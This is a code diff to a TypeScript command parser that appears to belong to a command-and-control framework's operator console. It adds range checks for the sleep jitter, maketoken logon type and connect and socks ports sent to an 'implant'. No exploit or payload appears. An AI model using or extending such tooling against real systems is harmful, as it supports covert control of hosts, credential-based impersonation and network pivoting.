@@ -204,12 +204,9 @@ export interface ParsedCommand {
  *   sleep <sec> [jitter]
  *   download <path>
  *   cd <path>
- *   ls [path]                 -> emitted as a fileop (see note below)
- *
- * NOTE: types.ts's JsonCommand `fileop` op union is 'cd'|'mkdir'|'rm'|'mv'|'cp'
- * and we are not permitted to edit lib/. A real `ls` op presumably lives on the
- * backend; for MVP we widen via `as` so the wire payload carries op:'ls' to the
- * server verbatim. The integration step / backend can extend the union later.
+ *   ls [path]                 -> emitted as a fileop (op 'ls', supported
+ *                                end-to-end: protocol FileOp::Ls wire tag 5,
+ *                                server mapping, implant fileop_ls).
  */
 export function parseCommand(line: string): ParsedCommand | null {
   const trimmed = line.trim();
@@ -238,7 +235,11 @@ export function parseCommand(line: string): ParsedCommand | null {
       let jitter = 0;
       if (args.length >= 2) {
         const j = parseInt(args[1], 10);
-        if (Number.isFinite(j)) jitter = j;
+        // Server field is jitter_pct: u8 and the implant treats it as a
+        // percentage (span = base * jitter / 100), so reject anything outside
+        // 0..=100 instead of sending a value serde will 400 on.
+        if (Number.isFinite(j) && j >= 0 && j <= 100) jitter = j;
+        else return null;
       }
       return {
         command: { type: 'sleep', seconds, jitter_pct: jitter },
@@ -340,14 +341,23 @@ export function parseCommand(line: string): ParsedCommand | null {
 
     case 'maketoken': {
       // maketoken DOMAIN\user password [logon_type]
+      // logon_type: 1=interactive(默认) 2=network 3=new-credentials (server doc,
+      // crates/server/src/lib.rs). Default to 1; reject out-of-range values so
+      // the u8 field never receives an invalid number.
       if (args.length < 2) return null;
+      let logonType = 1;
+      if (args.length > 2) {
+        const lt = parseInt(args[2], 10);
+        if (![1, 2, 3].includes(lt)) return null;
+        logonType = lt;
+      }
       return {
         command: {
           type: 'maketoken',
           domain: args[0].split('\\')[0] || '',
           user: args[0].includes('\\') ? args[0].split('\\').slice(1).join('\\') : args[0],
           password: args[1],
-          logon_type: args.length > 2 ? parseInt(args[2], 10) || 2 : 2,
+          logon_type: logonType,
         },
         label: `maketoken ${args[0]}`,
       };
@@ -379,9 +389,13 @@ export function parseCommand(line: string): ParsedCommand | null {
 
     case 'connect': {
       if (args.length < 2) return null;
+      const port = parseInt(args[1], 10);
+      // Server field is port: u16 (crates/server/src/lib.rs) — reject 0 and
+      // anything above 65535 instead of sending a value serde will 400 on.
+      if (!Number.isFinite(port) || port < 1 || port > 65535) return null;
       return {
-        command: { type: 'connect', host: args[0], port: parseInt(args[1], 10) || 0 },
-        label: `connect ${args[0]}:${args[1]}`,
+        command: { type: 'connect', host: args[0], port },
+        label: `connect ${args[0]}:${port}`,
       };
     }
 
@@ -416,15 +430,18 @@ export function parseCommand(line: string): ParsedCommand | null {
     case 'socks': {
       // socks <chan> <op> <addr> <port>
       if (args.length < 4) return null;
+      const sport = parseInt(args[3], 10);
+      // Server field is port: u16 — same bound as `connect`.
+      if (!Number.isFinite(sport) || sport < 1 || sport > 65535) return null;
       return {
         command: {
           type: 'socks',
           chan: parseInt(args[0], 10) || 0,
           op: parseInt(args[1], 10) || 0,
           addr: args[2],
-          port: parseInt(args[3], 10) || 0,
+          port: sport,
         },
-        label: `socks chan=${args[0]} op=${args[1]} ${args[2]}:${args[3]}`,
+        label: `socks chan=${args[0]} op=${args[1]} ${args[2]}:${sport}`,
       };
     }
 
